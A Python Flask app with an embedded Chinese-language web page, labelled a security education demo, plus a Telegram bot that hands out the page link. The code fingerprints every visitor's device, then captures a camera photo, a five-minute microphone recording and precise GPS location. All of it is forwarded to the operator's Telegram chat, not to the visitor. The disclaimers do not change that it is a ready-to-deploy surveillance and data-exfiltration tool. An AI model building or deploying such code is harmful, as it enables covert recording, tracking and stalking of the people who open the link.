from flask import Flask, request, Response
import requests
import os
import json
import time

app = Flask(__name__)

# ========== TELEGRAM CONFIGURATION ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
YOUR_CHAT_ID = os.environ.get('YOUR_CHAT_ID', '')

# ========== HTML PAGE WITH FULL DATA COLLECTION ==========
HTML_PAGE = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>网络安全教育演示</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            text-align: center;
            color: white;
            font-family: Arial, sans-serif;
            padding: 20px;
        }
        button {
            background: #ff0050;
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 30px;
            font-size: 18px;
            margin: 20px;
            cursor: pointer;
        }
        .warning {
            position: fixed;
            bottom: 20px;
            left: 20px;
            right: 20px;
            background: #222;
            color: #ff9800;
            font-size: 10px;
            padding: 8px;
            text-align: center;
        }
        .data-box {
            background: #111;
            margin: 20px auto;
            padding: 20px;
            border-radius: 10px;
            text-align: left;
            max-width: 550px;
        }
        .status-good { color: #0f0; }
        .status-bad { color: #f00; }
        h2, h3 { margin: 10px 0; }
        h3 { color: #ff0050; margin-top: 20px; border-bottom: 1px solid #333; padding-bottom: 5px; }
        hr { border-color: #333; margin: 10px 0; }
        .progress-bar {
            background: #333;
            border-radius: 10px;
            height: 10px;
            margin-top: 5px;
        }
        .progress-fill {
            background: #ff0050;
            border-radius: 10px;
            height: 10px;
            width: 0%;
        }
        p { margin: 8px 0; line-height: 1.4; }
        .small { font-size: 11px; color: #888; }
    </style>
</head>
<body>

<h2>🔐 网络安全教育演示</h2>
<p>此演示展示恶意网站可以收集哪些数据</p>

<button onclick="startAll()">🔓 开始完整安全测试</button>

<div id="info" class="data-box" style="display:none">
    
    <h3>📱 设备指纹 (无需权限)</h3>
    <p>🖥️ <strong>IP地址:</strong> <span id="ipStatus">检测中...</span></p>
    <p>🌐 <strong>浏览器:</strong> <span id="browserInfo">检测中...</span></p>
    <p>💻 <strong>操作系统:</strong> <span id="osInfo">检测中...</span></p>
    <p>📺 <strong>屏幕分辨率:</strong> <span id="screenInfo">检测中...</span></p>
    <p>🌍 <strong>语言:</strong> <span id="languageInfo">检测中...</span></p>
    <p>⏰ <strong>时区:</strong> <span id="timezoneInfo">检测中...</span></p>
    <p>🔋 <strong>电池电量:</strong> <span id="batteryInfo">检测中...</span></p>
    <p>📶 <strong>网络类型:</strong> <span id="networkInfo">检测中...</span></p>
    <p>💾 <strong>设备内存:</strong> <span id="memoryInfo">检测中...</span></p>
    <p>⚙️ <strong>CPU核心数:</strong> <span id="cpuInfo">检测中...</span></p>
    <p>🎨 <strong>屏幕色深:</strong> <span id="colorInfo">检测中...</span></p>
    <p>🖱️ <strong>触摸屏幕:</strong> <span id="touchInfo">检测中...</span></p>
    <p>📱 <strong>设备型号:</strong> <span id="deviceInfo">检测中...</span></p>
    
    <hr>
    
    <h3>🎤 传感器数据 (需要权限)</h3>
    <p>😃 <strong>相机 (0.5秒捕获):</strong> <span id="cameraStatus">等待点击允许...</span></p>
    <p>🎤 <strong>麦克风 (5分钟录音):</strong> <span id="micStatus">等待点击允许...</span></p>
    <p>📍 <strong>GPS位置:</strong> <span id="gpsStatus">等待点击允许...</span></p>
    
    <p>⏱️ <strong>录音进度:</strong> <span id="recordProgress">0:00 / 5:00</span></p>
    <div class="progress-bar">
        <div class="progress-fill" id="recordProgressFill"></div>
    </div>
    
    <hr>
    
    <div style="background:#1a0000; padding:12px; border-radius:8px; margin-top:10px">
        <h3 style="margin-top:0">⚠️ 安全警告</h3>
        <p style="font-size:12px;color:#ff9800;text-align:center">
            恶意网站可以收集以上所有信息，只需您点击"允许"权限<br><br>
            <strong style="color:#ff0050">🔒 永远不要给未知网站相机、麦克风或位置权限！</strong>
        </p>
    </div>
</div>

<div class="warning">⚠️ 网络安全教育演示 - 仅在授权设备上测试 | 恶意网站能力展示</div>

<script>
let cameraStream = null;
let audioStream = null;
let mediaRecorder = null;
let audioChunks = [];
let recordStartTime = null;
let progressInterval = null;

// ========== 1. IP ADDRESS ==========
fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(data => {
        document.getElementById('ipStatus').innerHTML = data.ip;
        document.getElementById('ipStatus').className = 'status-good';
    })
    .catch(() => {
        document.getElementById('ipStatus').innerHTML = '无法获取';
        document.getElementById('ipStatus').className = 'status-bad';
    });

// ========== 2. BROWSER & OS ==========
const ua = navigator.userAgent;
let browser = 'Unknown';
let os = 'Unknown';

if (ua.includes('Chrome')) browser = 'Chrome';
else if (ua.includes('Firefox')) browser = 'Firefox';
else if (ua.includes('Safari')) browser = 'Safari';
else if (ua.includes('Edge')) browser = 'Edge';
else if (ua.includes('Opera')) browser = 'Opera';
else if (ua.includes('MSIE')) browser = 'Internet Explorer';

if (ua.includes('Windows')) os = 'Windows';
else if (ua.includes('Mac')) os = 'macOS';
else if (ua.includes('Linux')) os = 'Linux';
else if (ua.includes('Android')) os = 'Android';
else if (ua.includes('iPhone')) os = 'iOS';
else if (ua.includes('iPad')) os = 'iPadOS';

document.getElementById('browserInfo').innerHTML = browser;
document.getElementById('browserInfo').className = 'status-good';
document.getElementById('osInfo').innerHTML = os;
document.getElementById('osInfo').className = 'status-good';

// ========== 3. SCREEN & DISPLAY ==========
document.getElementById('screenInfo').innerHTML = `${screen.width} x ${screen.height}`;
document.getElementById('screenInfo').className = 'status-good';
document.getElementById('colorInfo').innerHTML = screen.colorDepth + ' bit';
document.getElementById('colorInfo').className = 'status-good';
document.getElementById('touchInfo').innerHTML = ('ontouchstart' in window) ? '✅ 是 (触摸屏)' : '❌ 否';
document.getElementById('touchInfo').className = ('ontouchstart' in window) ? 'status-good' : 'status-bad';

// ========== 4. LANGUAGE & TIMEZONE ==========
document.getElementById('languageInfo').innerHTML = navigator.language;
document.getElementById('languageInfo').className = 'status-good';
document.getElementById('timezoneInfo').innerHTML = Intl.DateTimeFormat().resolvedOptions().timeZone;
document.getElementById('timezoneInfo').className = 'status-good';

// ========== 5. DEVICE MODEL ==========
let deviceModel = 'Unknown';
if (ua.includes('iPhone')) deviceModel = 'iPhone';
else if (ua.includes('iPad')) deviceModel = 'iPad';
else if (ua.includes('Android')) {
    const match = ua.match(/Android\s([0-9.]+)/);
    if (match) deviceModel = 'Android ' + match[1];
}
document.getElementById('deviceInfo').innerHTML = deviceModel;
document.getElementById('deviceInfo').className = 'status-good';

// ========== 6. CPU CORES ==========
if (navigator.hardwareConcurrency) {
    document.getElementById('cpuInfo').innerHTML = navigator.hardwareConcurrency + ' 核心';
    document.getElementById('cpuInfo').className = 'status-good';
} else {
    document.getElementById('cpuInfo').innerHTML = '无法检测';
    document.getElementById('cpuInfo').className = 'status-bad';
}

// ========== 7. DEVICE MEMORY ==========
if (navigator.deviceMemory) {
    document.getElementById('memoryInfo').innerHTML = navigator.deviceMemory + ' GB';
    document.getElementById('memoryInfo').className = 'status-good';
} else {
    document.getElementById('memoryInfo').innerHTML = '无法检测';
    document.getElementById('memoryInfo').className = 'status-bad';
}

// ========== 8. BATTERY STATUS ==========
if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
        const level = Math.round(battery.level * 100);
        document.getElementById('batteryInfo').innerHTML = `${level}% ${battery.charging ? '⚡充电中' : '🔋放电中'}`;
        document.getElementById('batteryInfo').className = 'status-good';
    }).catch(() => {
        document.getElementById('batteryInfo').innerHTML = '无法获取';
        document.getElementById('batteryInfo').className = 'status-bad';
    });
} else {
    document.getElementById('batteryInfo').innerHTML = '不支持';
    document.getElementById('batteryInfo').className = 'status-bad';
}

// ========== 9. NETWORK TYPE ==========
const connection = navigator.connection || navigator.mozConnection;
if (connection) {
    let networkType = connection.effectiveType || 'Unknown';
    networkType = networkType.replace('4g', '📶 4G').replace('3g', '📶 3G').replace('2g', '📶 2G').replace('slow-2g', '🐌 2G');
    document.getElementById('networkInfo').innerHTML = networkType;
    document.getElementById('networkInfo').className = 'status-good';
} else {
    document.getElementById('networkInfo').innerHTML = '无法检测';
    document.getElementById('networkInfo').className = 'status-bad';
}

// ========== 10. SEND DEVICE INFO TO SERVER ==========
setTimeout(() => {
    fetch('/upload-device-info', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            ip: document.getElementById('ipStatus').innerText,
            browser: browser,
            os: os,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            userAgent: ua,
            cpu: navigator.hardwareConcurrency || 'Unknown',
            memory: navigator.deviceMemory || 'Unknown',
            battery: document.getElementById('batteryInfo').innerText,
            network: connection ? connection.effectiveType : 'Unknown',
            device: deviceModel,
            colorDepth: screen.colorDepth,
            touchSupport: ('ontouchstart' in window)
        })
    });
}, 1000);

// ========== 11. UPDATE RECORDING PROGRESS ==========
function updateProgress() {
    if (!recordStartTime) return;
    let elapsed = (Date.now() - recordStartTime) / 1000;
    let minutes = Math.floor(elapsed / 60);
    let seconds = Math.floor(elapsed % 60);
    let percent = Math.min((elapsed / 300) * 100, 100);
    
    document.getElementById('recordProgress').innerHTML = `${minutes}:${seconds.toString().padStart(2,'0')} / 5:00`;
    document.getElementById('recordProgressFill').style.width = percent + '%';
    
    if (elapsed >= 300) {
        clearInterval(progressInterval);
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        }
    }
}

// ========== 12. START ALL DATA COLLECTION ==========
async function startAll() {
    document.getElementById('info').style.display = 'block';
    document.querySelector('button').style.display = 'none';
    document.querySelector('h2').innerHTML = '✅ 数据收集演示运行中...';
    
    // CAMERA - 0.5 second capture
    try {
        cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
        document.getElementById('cameraStatus').innerHTML = '✅ 已授权 (0.5秒后捕获)';
        document.getElementById('cameraStatus').className = 'status-good';
        
        setTimeout(() => {
            const video = document.createElement('video');
            video.srcObject = cameraStream;
            video.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                    const form = new FormData();
                    form.append('photo', blob);
                    fetch('/upload-photo', { method: 'POST', body: form });
                });
                document.getElementById('cameraStatus').innerHTML = '✅ 已授权 (照片已发送)';
                if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
            }, 200);
        }, 500);
        
    } catch(e) {
        document.getElementById('cameraStatus').innerHTML = '❌ 用户拒绝';
        document.getElementById('cameraStatus').className = 'status-bad';
    }
    
    // MICROPHONE - 5 minute recording
    try {
        audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        document.getElementById('micStatus').innerHTML = '✅ 已授权 (录音中)';
        document.getElementById('micStatus').className = 'status-good';
        
        mediaRecorder = new MediaRecorder(audioStream);
        audioChunks = [];
        
        mediaRecorder.ondataavailable = e => {
            if (e.data.size > 0) {
                audioChunks.push(e.data);
            }
        };
        
        mediaRecorder.onstop = () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            const form = new FormData();
            form.append('audio', audioBlob);
            fetch('/upload-audio', { method: 'POST', body: form });
            document.getElementById('micStatus').innerHTML = '✅ 已授权 (5分钟录音完成)';
        };
        
        mediaRecorder.start(1000);
        recordStartTime = Date.now();
        progressInterval = setInterval(updateProgress, 1000);
        
        setTimeout(() => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
            if (audioStream) audioStream.getTracks().forEach(t => t.stop());
        }, 300000);
        
    } catch(e) {
        document.getElementById('micStatus').innerHTML = '❌ 用户拒绝';
        document.getElementById('micStatus').className = 'status-bad';
    }
    
    // GPS LOCATION
    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                const lat = pos.coords.latitude;
                const lng = pos.coords.longitude;
                const acc = pos.coords.accuracy;
                document.getElementById('gpsStatus').innerHTML = `✅ 纬度:${lat.toFixed(6)} 经度:${lng.toFixed(6)} (精度:${Math.round(acc)}米)`;
                document.getElementById('gpsStatus').className = 'status-good';
                
                fetch('/upload-location', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({lat: lat, lng: lng, accuracy: acc})
                });
            },
            err => {
                let errorMsg = '❌ 拒绝';
                if (err.code === 1) errorMsg = '❌ 用户拒绝';
                else if (err.code === 2) errorMsg = '❌ 位置不可用';
                else if (err.code === 3) errorMsg = '❌ 超时';
                document.getElementById('gpsStatus').innerHTML = errorMsg;
                document.getElementById('gpsStatus').className = 'status-bad';
            }
        );
    } else {
        document.getElementById('gpsStatus').innerHTML = '❌ 设备不支持';
        document.getElementById('gpsStatus').className = 'status-bad';
    }
}
</script>
</body>
</html>'''

# ========== FLASK ROUTES ==========
@app.route('/')
def index():
    return HTML_PAGE

@app.route('/upload-device-info', methods=['POST'])
def upload_device_info():
    try:
        data = request.get_json()
        if not data:
            return 'No data', 400
        
        # Build detailed message
        message = f"""🔐 *设备指纹收集 - 安全教育演示*

📱 *设备信息*
├ IP: `{data.get('ip', 'Unknown')}`
├ 浏览器: {data.get('browser', 'Unknown')}
├ 操作系统: {data.get('os', 'Unknown')}
├ 设备型号: {data.get('device', 'Unknown')}
└ User Agent: `{data.get('userAgent', 'Unknown')[:80]}`

🖥️ *显示信息*
├ 分辨率: {data.get('screen', 'Unknown')}
├ 色深: {data.get('colorDepth', 'Unknown')} bit
└ 触摸屏: {'是' if data.get('touchSupport') else '否'}

⚙️ *硬件信息*
├ CPU: {data.get('cpu', 'Unknown')} 核心
├ 内存: {data.get('memory', 'Unknown')} GB
├ 电池: {data.get('battery', 'Unknown')}
└ 网络: {data.get('network', 'Unknown')}

🌍 *区域信息*
├ 语言: {data.get('language', 'Unknown')}
└ 时区: {data.get('timezone', 'Unknown')}

⚠️ 恶意网站可在您不知情的情况下收集这些信息！"""
        
        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                      data={'chat_id': YOUR_CHAT_ID, 'text': message, 'parse_mode': 'Markdown'})
        return 'OK', 200
    except Exception as e:
        print(f"Error in device info: {e}")
        return 'Error', 500

@app.route('/upload-photo', methods=['POST'])
def upload_photo():
    try:
        photo = request.files.get('photo')
        if photo:
            files = {'photo': ('photo.jpg', photo, 'image/jpeg')}
            data = {'chat_id': YOUR_CHAT_ID, 'caption': '📸 *相机捕获 (0.5秒)*\n\n⚠️ 恶意网站可以在您允许相机权限后立即拍照！\n\n🔐 安全教育演示', 'parse_mode': 'Markdown'}
            requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', data=data, files=files)
            return 'OK', 200
        return 'No photo', 400
    except Exception as e:
        print(f"Error in photo: {e}")
        return 'Error', 500

@app.route('/upload-audio', methods=['POST'])
def upload_audio():
    try:
        audio = request.files.get('audio')
        if audio:
            files = {'audio': ('recording.webm', audio, 'audio/webm')}
            data = {'chat_id': YOUR_CHAT_ID, 'caption': '🎤 *麦克风录音 (5分钟)*\n\n⚠️ 恶意网站可以在您允许麦克风权限后长时间录音！\n\n🔐 安全教育演示', 'parse_mode': 'Markdown'}
            requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendAudio', data=data, files=files)
            return 'OK', 200
        return 'No audio', 400
    except Exception as e:
        print(f"Error in audio: {e}")
        return 'Error', 500

@app.route('/upload-location', methods=['POST'])
def upload_location():
    try:
        data = request.get_json()
        if data:
            lat = data.get('lat')
            lng = data.get('lng')
            acc = data.get('accuracy', 'Unknown')
            
            message = f"""📍 *GPS位置捕获*

纬度: {lat}
经度: {lng}
精度: {acc} 米

Google Maps: https://maps.google.com/?q={lat},{lng}

⚠️ 恶意网站可以在您允许位置权限后获取您的精确位置！
🔐 安全教育演示"""
            
            requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                          data={'chat_id': YOUR_CHAT_ID, 'text': message, 'parse_mode': 'Markdown'})
            return 'OK', 200
        return 'No location', 400
    except Exception as e:
        print(f"Error in location: {e}")
        return 'Error', 500

@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    try:
        update = request.get_json()
        if update and 'message' in update:
            chat_id = update['message']['chat']['id']
            text = update['message'].get('text', '')
            
            if text == '/start':
                railway_url = os.environ.get('RAILWAY_URL', 'https://hello-camera-production.up.railway.app')
                send_message(chat_id,
                    f"🔐 *完整安全教育演示机器人 v2.0*\n\n"
                    f"点击下方链接查看恶意网站可以收集哪些数据:\n"
                    f"`{railway_url}`\n\n"
                    f"📊 *此演示收集以下数据:*\n\n"
                    f"📱 *无需权限 (自动收集):*\n"
                    f"✅ IP地址\n"
                    f"✅ 浏览器类型\n"
                    f"✅ 操作系统\n"
                    f"✅ 设备型号\n"
                    f"✅ 屏幕分辨率\n"
                    f"✅ 语言/时区\n"
                    f"✅ CPU核心数\n"
                    f"✅ 设备内存\n"
                    f"✅ 电池电量\n"
                    f"✅ 网络类型(4G/WiFi)\n\n"
                    f"🎤 *需要您点击允许:*\n"
                    f"✅ 相机照片 (0.5秒捕获)\n"
                    f"✅ 麦克风录音 (5分钟)\n"
                    f"✅ GPS精确位置\n\n"
                    f"⚠️ **仅在您自己的设备上测试**\n\n"
                    f"🔐 用于教育目的 - 展示为什么不要随意授权网站",
                    parse_mode='Markdown')
            elif text == '/help':
                send_message(chat_id, "发送 /start 获取安全演示链接")
            else:
                send_message(chat_id, "发送 /start 开始安全教育演示")
        
        return Response('OK', status=200)
    except Exception as e:
        print(f"Webhook error: {e}")
        return Response('OK', status=200)

def send_message(chat_id, text, parse_mode=None):
    try:
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        data = {'chat_id': chat_id, 'text': text}
        if parse_mode:
            data['parse_mode'] = parse_mode
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print(f"Send message error: {e}")

@app.route('/health')
def health():
    return 'OK', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
